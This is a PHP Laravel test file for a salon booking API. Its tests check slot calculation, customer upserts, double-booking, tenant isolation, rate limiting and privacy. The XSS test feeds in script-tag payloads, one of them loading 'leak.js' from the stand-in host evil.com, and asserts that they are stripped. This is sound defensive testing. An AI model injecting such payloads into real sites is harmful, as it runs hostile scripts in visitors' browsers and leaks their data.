<?php

namespace Tests\Feature\Api\V1;

use App\Enums\AppointmentStatus;
use App\Models\Appointment;
use App\Models\Customer;
use App\Models\Salon;
use App\Models\Service;
use Carbon\Carbon;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class BookingApiSecurityAndFunctionalTest extends TestCase
{
    use RefreshDatabase;

    protected Salon $salon;
    protected Service $classicService;
    protected Service $vipService;

    protected function setUp(): void
    {
        parent::setUp();

        $this->salon = Salon::create([
            'name' => 'سالن آرون',
            'slug' => 'aron',
            'phone' => '02188889999',
            'address' => 'تهران، خیابان ولیعصر',
            'opening_time' => '10:00',
            'closing_time' => '22:00',
            'slot_interval_minutes' => 30,
            'is_active' => true,
        ]);

        $this->classicService = Service::create([
            'salon_id' => $this->salon->id,
            'title' => 'اصلاح کلاسیک',
            'duration_minutes' => 30,
            'price' => 250000,
            'show_price' => true,
            'is_active' => true,
        ]);

        $this->vipService = Service::create([
            'salon_id' => $this->salon->id,
            'title' => 'پکیج کامل VIP',
            'duration_minutes' => 60,
            'price' => 500000,
            'show_price' => false,
            'is_active' => true,
        ]);
    }

    /**
     * 1. GET /api/v1/salons/{slug} returns 200 with metadata and nullifies prices if show_price is false.
     */
    public function test_01_get_salon_returns_metadata_and_nullifies_prices_when_show_price_is_false(): void
    {
        $response = $this->getJson('/api/v1/salons/aron');

        $response->assertStatus(200)
            ->assertJson([
                'success' => true,
                'data' => [
                    'salon' => [
                        'name' => 'سالن آرون',
                        'slug' => 'aron',
                        'opening_time' => '10:00',
                        'closing_time' => '22:00',
                    ],
                ],
                'message' => 'Salon details retrieved successfully.',
            ]);

        $services = $response->json('data.services');
        $this->assertCount(2, $services);

        $classic = collect($services)->firstWhere('title', 'اصلاح کلاسیک');
        $this->assertEquals(250000, $classic['price']);
        $this->assertTrue($classic['show_price']);

        $vip = collect($services)->firstWhere('title', 'پکیج کامل VIP');
        $this->assertNull($vip['price']);
        $this->assertFalse($vip['show_price']);
    }

    /**
     * 2. GET /api/v1/salons/invalid-slug returns clean 404.
     */
    public function test_02_get_salon_with_invalid_slug_returns_clean_404(): void
    {
        $response = $this->getJson('/api/v1/salons/invalid-slug');

        $response->assertStatus(404)
            ->assertJson([
                'success' => false,
                'data' => null,
                'message' => 'Salon not found or inactive.',
            ]);
    }

    /**
     * 3. GET /api/v1/salons/{slug}/slots correctly calculates slots based on service duration and skips booked intervals.
     */
    public function test_03_get_slots_calculates_slots_based_on_duration_and_skips_booked_intervals(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $customer = Customer::create([
            'salon_id' => $this->salon->id,
            'name' => 'مشتری اول',
            'phone' => '09121112222',
        ]);

        // Existing booking at 11:00 - 11:30
        Appointment::create([
            'salon_id' => $this->salon->id,
            'service_id' => $this->classicService->id,
            'customer_id' => $customer->id,
            'starts_at' => Carbon::parse("$targetDate 11:00"),
            'ends_at' => Carbon::parse("$targetDate 11:30"),
            'status' => AppointmentStatus::CONFIRMED,
        ]);

        $response = $this->getJson("/api/v1/salons/aron/slots?date={$targetDate}&service_id={$this->classicService->id}");

        $response->assertStatus(200)
            ->assertJson([
                'success' => true,
                'data' => [
                    'date' => $targetDate,
                    'service_id' => $this->classicService->id,
                    'duration_minutes' => 30,
                ],
            ]);

        $slots = $response->json('data.slots');

        $this->assertContains('10:00', $slots);
        $this->assertContains('10:30', $slots);
        $this->assertNotContains('11:00', $slots, '11:00 is booked and must not be available');
        $this->assertContains('11:30', $slots);
    }

    /**
     * 4. POST /api/v1/salons/{slug}/book successfully stores appointment and upserts customer record.
     */
    public function test_04_post_book_stores_appointment_and_upserts_customer_record(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $payload = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '13:00',
            'customer_name' => 'مهدی کاظمی',
            'customer_phone' => '09123334455',
            'notes' => 'رزرو نخست',
        ];

        $response = $this->postJson('/api/v1/salons/aron/book', $payload);

        $response->assertStatus(201)
            ->assertJson([
                'success' => true,
                'data' => [
                    'status' => 'confirmed',
                    'customer' => [
                        'name' => 'مهدی کاظمی',
                        'phone' => '09123334455',
                    ],
                ],
                'message' => 'Appointment booked successfully.',
            ]);

        $this->assertDatabaseHas('customers', [
            'salon_id' => $this->salon->id,
            'phone' => '09123334455',
            'name' => 'مهدی کاظمی',
        ]);

        $this->assertEquals(1, Customer::where('salon_id', $this->salon->id)->where('phone', '09123334455')->count());

        // Booking a second appointment for the same customer updates their name if changed (upsert) without creating duplicate customer
        $secondPayload = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '15:00',
            'customer_name' => 'مهدی کاظمی (ویرایش)',
            'customer_phone' => '09123334455',
        ];

        $secondResponse = $this->postJson('/api/v1/salons/aron/book', $secondPayload);
        $secondResponse->assertStatus(201);

        $this->assertEquals(1, Customer::where('salon_id', $this->salon->id)->where('phone', '09123334455')->count());
        $this->assertDatabaseHas('customers', [
            'salon_id' => $this->salon->id,
            'phone' => '09123334455',
            'name' => 'مهدی کاظمی (ویرایش)',
        ]);
    }

    /**
     * 5. Race Condition Protection: Parallel/immediate consecutive booking requests for the exact same slot must reject the second one.
     */
    public function test_05_race_condition_protection_immediate_consecutive_requests_reject_second(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $payload1 = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '16:00',
            'customer_name' => 'مشتری الف',
            'customer_phone' => '09121112233',
        ];

        $payload2 = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '16:00',
            'customer_name' => 'مشتری ب',
            'customer_phone' => '09124445566',
        ];

        $response1 = $this->postJson('/api/v1/salons/aron/book', $payload1);
        $response2 = $this->postJson('/api/v1/salons/aron/book', $payload2);

        $response1->assertStatus(201);
        $response2->assertStatus(409)
            ->assertJson([
                'success' => false,
                'data' => null,
                'message' => 'The selected slot is no longer available.',
            ]);
    }

    /**
     * 6. IDOR / Tenant Isolation: Attempting to book a service_id belonging to Salon B under Salon A's slug must be rejected (422 or 404).
     */
    public function test_06_idor_tenant_isolation_rejects_booking_service_from_another_salon(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $salonB = Salon::create([
            'name' => 'سالن دوم (بی)',
            'slug' => 'salon-b',
            'phone' => '02177778888',
            'opening_time' => '10:00',
            'closing_time' => '22:00',
            'is_active' => true,
        ]);

        $serviceOfSalonB = Service::create([
            'salon_id' => $salonB->id,
            'title' => 'خدمت اختصاصی سالن بی',
            'duration_minutes' => 45,
            'price' => 300000,
            'is_active' => true,
        ]);

        // Attempting to book Salon B's service using Salon A's endpoint
        $payload = [
            'service_id' => $serviceOfSalonB->id,
            'date' => $targetDate,
            'start_time' => '12:00',
            'customer_name' => 'مهاجم آی‌دی‌او‌آر',
            'customer_phone' => '09129990000',
        ];

        $response = $this->postJson('/api/v1/salons/aron/book', $payload);

        $response->assertStatus(422)
            ->assertJson([
                'success' => false,
                'message' => 'The given data was invalid.',
            ]);

        $this->assertArrayHasKey('service_id', $response->json('data'));
    }

    /**
     * 7. XSS & Payload Sanitization: Submitting `<script>alert('xss')</script>` in customer_name or notes must be sanitized or safely escaped without executing.
     */
    public function test_07_xss_and_payload_sanitization_strips_malicious_script_tags(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        // 7a. Pure XSS script payload in customer_name is stripped to empty string and rejected by min:2 validation
        $pureXssPayload = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '10:00',
            'customer_name' => "<script>alert('xss')</script>",
            'customer_phone' => '09120001122',
        ];

        $responseA = $this->postJson('/api/v1/salons/aron/book', $pureXssPayload);
        $responseA->assertStatus(422);

        // 7b. Mixed XSS payload has tags completely stripped before persisting
        $mixedXssPayload = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '10:30',
            'customer_name' => "کامران <script>alert('xss')</script> سعیدی",
            'customer_phone' => '09120001122',
            'notes' => "یادداشت امن <script src='http://evil.com/leak.js'></script> بدون اسکریپت",
        ];

        $responseB = $this->postJson('/api/v1/salons/aron/book', $mixedXssPayload);
        $responseB->assertStatus(201);

        $customer = Customer::where('phone', '09120001122')->firstOrFail();
        $this->assertStringNotContainsString('<script>', $customer->name);
        $this->assertStringNotContainsString('alert', $customer->name);
        $this->assertEquals('کامران  سعیدی', $customer->name);

        $appointment = Appointment::where('customer_id', $customer->id)->firstOrFail();
        $this->assertStringNotContainsString('<script', (string) $appointment->barber_notes);
        $this->assertEquals('یادداشت امن  بدون اسکریپت', $appointment->barber_notes);
    }

    /**
     * 8. Off-Hours Tampering: Attempting to force-book a slot outside opening/closing hours (e.g. 03:00 AM) must be rejected with 422.
     */
    public function test_08_off_hours_tampering_rejects_slot_outside_opening_closing_hours(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $offHoursPayload = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '03:00', // Salon hours are 10:00 - 22:00
            'customer_name' => 'مشتری شبانه',
            'customer_phone' => '09125556677',
        ];

        $response = $this->postJson('/api/v1/salons/aron/book', $offHoursPayload);

        $response->assertStatus(422)
            ->assertJson([
                'success' => false,
                'data' => null,
                'message' => 'The requested appointment is outside salon operating hours.',
            ]);
    }

    /**
     * 9. Rate Limiting: Sending more than 10 booking requests per minute from the same IP must trigger 429 Too Many Requests.
     */
    public function test_09_rate_limiting_triggers_429_too_many_requests_after_10_requests(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $payload = [
            'service_id' => $this->classicService->id,
            'date' => $targetDate,
            'start_time' => '14:00',
            'customer_name' => 'کاربر تستی ریت‌لیمیت',
            'customer_phone' => '09129991122',
        ];

        // Send 10 requests from the same IP (127.0.0.1)
        for ($i = 1; $i <= 10; $i++) {
            $this->withServerVariables(['REMOTE_ADDR' => '192.168.1.100'])
                ->postJson('/api/v1/salons/aron/book', $payload);
        }

        // 11th request must hit 429 Too Many Requests
        $eleventhResponse = $this->withServerVariables(['REMOTE_ADDR' => '192.168.1.100'])
            ->postJson('/api/v1/salons/aron/book', $payload);

        $eleventhResponse->assertStatus(429);
    }

    /**
     * 10. Data Privacy: Slot endpoints must strictly return free time arrays and NEVER leak customer names, phone numbers, or notes from occupied slots.
     */
    public function test_10_data_privacy_slots_endpoint_never_leaks_customer_details(): void
    {
        $targetDate = Carbon::tomorrow()->toDateString();

        $confidentialCustomer = Customer::create([
            'salon_id' => $this->salon->id,
            'name' => 'محرمانه رازقی',
            'phone' => '09129998877',
            'notes' => 'یادداشت کاملاً محرمانه اطلاعات پزشکی و شخصی',
        ]);

        Appointment::create([
            'salon_id' => $this->salon->id,
            'service_id' => $this->classicService->id,
            'customer_id' => $confidentialCustomer->id,
            'starts_at' => Carbon::parse("$targetDate 12:00"),
            'ends_at' => Carbon::parse("$targetDate 12:30"),
            'status' => AppointmentStatus::CONFIRMED,
            'barber_notes' => 'یادداشت خصوصی آرایشگر',
        ]);

        $response = $this->getJson("/api/v1/salons/aron/slots?date={$targetDate}&service_id={$this->classicService->id}");

        $response->assertStatus(200);

        $rawContent = $response->getContent();

        $this->assertStringNotContainsString('محرمانه', $rawContent);
        $this->assertStringNotContainsString('09129998877', $rawContent);
        $this->assertStringNotContainsString('رازقی', $rawContent);
        $this->assertStringNotContainsString('اطلاعات پزشکی', $rawContent);
        $this->assertStringNotContainsString('یادداشت خصوصی', $rawContent);

        // Ensure slots payload strictly contains only formatted string times
        $slots = $response->json('data.slots');
        $this->assertIsArray($slots);
        foreach ($slots as $slot) {
            $this->assertMatchesRegularExpression('/^\d{2}:\d{2}$/', $slot);
        }
    }
}
